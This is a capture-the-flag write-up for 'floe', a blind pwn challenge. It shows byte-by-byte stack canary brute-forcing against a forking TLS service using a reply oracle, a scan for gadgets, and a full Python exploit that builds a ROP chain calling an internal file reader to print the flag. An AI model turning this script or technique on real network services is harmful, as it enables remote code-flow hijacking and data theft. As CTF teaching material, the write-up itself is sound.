---
title: "floe"
ctf: "CryoVault Finals"
date: 2026-10-24
category: pwn
difficulty: hard
points: 500
flag_format: "isfcr{...}"
author: "OpenCode"
---

# floe

## Summary

`floe` is a blind pwn service: no binary, only
`isfcrpesu-floe.chals.io:443` wrapped in TLS, which greets with
`floe stream open.` / `floe> ` and answers every frame with `logged <n>.`.
Because the service forks a child per connection, its stack canary is stable
across connections, so the canary can be brute-forced byte by byte with the
`logged <n>.` reply as a liveness oracle. Once RIP is controlled, a
`pop rdi; ret` gadget plus an internal file-reader ("seam") is used as
`ret2seam("flag.txt")`. The text segment is full of self-labelled decoys
(`isfcr{...d3c0y...}`), which were skipped.

## Solution

### Step 1: Frame format, buffer boundary and canary

Framing is a 2-byte big-endian length followed by exactly that many body bytes.
Body length 88 survives, 89 with filler `A` dies — a `char buf[88]` with a stack
canary at offset 88. A length sweep with a *correct* canary shows the reply still
appears up to body length 112 and dies at 113, because offset 112 holds main's
`int fd = 4`: zeroing it does not crash the reader but makes main's later
`dprintf` write to an invalid descriptor. Preserving `fd = 4` at offset 112 and
`r13 = 2` at offset 120 (the next header length) lets the loop keep replying all
the way to length 136; length 137 dies, so the saved return address is at 136.

Children forked from one parent share the canary, so it is recovered one byte at
a time (first byte `0x00`): a frame of `88 + known_prefix + guess` prints
`logged <n>.` only when the guess matches. The canary rotates when the service
restarts, so the recovery loop re-validates its prefix and starts over.

### Step 2: Map the text segment and find the win path

With RIP controlled, a return-address scan of `0x400000..0x402000` found a family
of decoy printers in `0x400500..0x400740`, all of which print strings that
contain `d3c0y` and `n0t_r34l` ("b4r3_pr0b3", "sw33p_b4it", "t3xt_sc4n",
"n0_4rg", "se4l_l00k4l1k3", "fr0z3n"). None of them is the flag.

The real primitive is at `0x400758`: it takes a path pointer in `rdi`, calls
`open(path, O_RDONLY)`, reads up to 256 bytes and writes them to the stored
connection fd, or prints `no record at that bearing` when `open` fails. The
template also keeps two hand-written gadgets used by the sibling challenges:

* `0x400570` — `pop rdi; ret`
* `0x400758` — the file-reader seam

Scanning candidate paths (`[0x400570][ptr][0x400758]`) over `.rodata` located the
`"flag.txt"` string at `0x401770`; feeding that pointer to the seam returns the
real flag. The neighbouring addresses `0x401750`, `0x40175b` and `0x401760` are
decoy flag strings (`d3c0y_s3cr3t`, `d3c0y_fl4g`, `d3c0y_fl4gtxt`), which is why
the path-pointer scan is the reliable discriminator.

### Step 3: ret2seam

```
buf[88] | canary | filler(16) | fd=4 | filler(4) | r13=2 | filler(8)
        | pop rdi; ret | &"flag.txt" (0x401770) | seam (0x400758)
```

```python
#!/usr/bin/env python3
"""floe (CryoVault Finals 2026, pwn) -- blind canary brute + ret2seam.

Endpoint: isfcrpesu-floe.chals.io:443 (TLS, certificate not verified)
Frame   : 2-byte big-endian length + body; reply "logged <n>.\n"
"""
import json, os, socket, ssl, struct, sys, threading, time
from concurrent.futures import ThreadPoolExecutor

HOST = "isfcrpesu-floe.chals.io"
PORT = 443
BUF, RET_OFF = 88, 136
POP_RDI, SEAM, FLAG_PATH = 0x400570, 0x400758, 0x401770   # "flag.txt"
WORKERS = 24
STATE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "canary.json")

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE


def connect(t=8.0):
    s = ctx.wrap_socket(socket.create_connection((HOST, PORT), timeout=t), server_hostname=HOST)
    s.settimeout(t)
    return s


def probe(body, deadline=1.6, idle=0.30):
    marker = b"logged %d.\n" % len(body)
    t0 = time.time()
    try:
        s = connect()
    except OSError:
        return None, b""
    out = b""
    try:
        s.sendall(struct.pack(">H", len(body)) + body)
        s.settimeout(idle)
        while time.time() - t0 < deadline:
            if marker in out:
                break
            try:
                d = s.recv(65536)
            except socket.timeout:
                continue
            except OSError:
                break
            if not d:
                break
            out += d
    except OSError:
        pass
    finally:
        s.close()
    return marker in out, out


def send(body, wait=2.5, idle=0.4):
    t0 = time.time()
    s = connect()
    out = b""
    try:
        s.sendall(struct.pack(">H", len(body)) + body)
        s.settimeout(idle)
        while time.time() - t0 < wait:
            try:
                d = s.recv(65536)
            except socket.timeout:
                continue
            except OSError:
                break
            if not d:
                break
            out += d
    finally:
        s.close()
    return out


def cbody(known, guess=None):
    return b"A" * BUF + known + (bytes([guess]) if guess is not None else b"")


def alive(known, tries=3):
    for _ in range(tries):
        if probe(cbody(known))[0]:
            return True
        time.sleep(0.05)
    return False


def scan_byte(known):
    stop, hits = threading.Event(), []
    lk = threading.Lock()

    def work(v):
        if stop.is_set():
            return
        for _ in range(2):
            ok, _ = probe(cbody(known, v))
            if ok:
                with lk:
                    hits.append(v)
                stop.set()
                return

    with ThreadPoolExecutor(max_workers=WORKERS) as ex:
        list(ex.map(work, range(256)))
    return sorted(hits)


def recover_canary():
    known = b"\x00"
    while len(known) < 8:
        if not alive(known):
            print("[-] service restarted, restarting canary recovery", flush=True)
            known = b"\x00"
            continue
        hits = scan_byte(known)
        print("[*] byte %d: %s" % (len(known), [hex(h) for h in hits]), flush=True)
        if len(hits) != 1:
            continue
        cand = known + bytes([hits[0]])
        if sum(probe(cbody(cand))[0] for _ in range(3)) < 2:
            continue
        known = cand
        json.dump({"canary": known.hex()}, open(STATE, "w"))
        print("[+] canary = %s" % known.hex(), flush=True)
    return known


def payload(canary):
    b = bytearray(b"A" * BUF + canary)
    b += b"\x00" * (112 - len(b))
    b += struct.pack("<I", 4) + b"\x00" * 4      # main's connection fd
    b += struct.pack("<Q", 2) + b"\x00" * 8      # next header length
    assert len(b) == RET_OFF
    b += struct.pack("<Q", POP_RDI)
    b += struct.pack("<Q", FLAG_PATH)
    b += struct.pack("<Q", SEAM)
    return bytes(b)


def main():
    canary = None
    if os.path.exists(STATE):
        canary = bytes.fromhex(json.load(open(STATE))["canary"])
        if not alive(canary, tries=2):
            canary = None
    canary = canary or recover_canary()

    for _ in range(8):
        if not alive(canary, tries=2):
            canary = recover_canary()
        out = send(payload(canary))
        print("[*] %r" % out[:200], flush=True)
        i = out.find(b"isfcr{")
        if i >= 0 and b"d3c0y" not in out:
            print("[+] FLAG:", out[i:out.find(b"}", i) + 1].decode())
            return 0
        time.sleep(0.3)
    return 1


if __name__ == "__main__":
    sys.exit(main())
```

Observed output:

```
[+] canary = 0054e8dfb7d1c80b
[*] b'floe stream open.\nfloe> isfcr{l3ngth_pr3f1x_fr4m1ng_bl1nd_br0p_fl0e_9d2e74}'
[+] FLAG: isfcr{l3ngth_pr3f1x_fr4m1ng_bl1nd_br0p_fl0e_9d2e74}
```

The payload was replayed on four fresh connections and returned the identical
flag each time. All `d3c0y` strings encountered during the text scan were
discarded as planted decoys.

## Flag

```
isfcr{l3ngth_pr3f1x_fr4m1ng_bl1nd_br0p_fl0e_9d2e74}
```
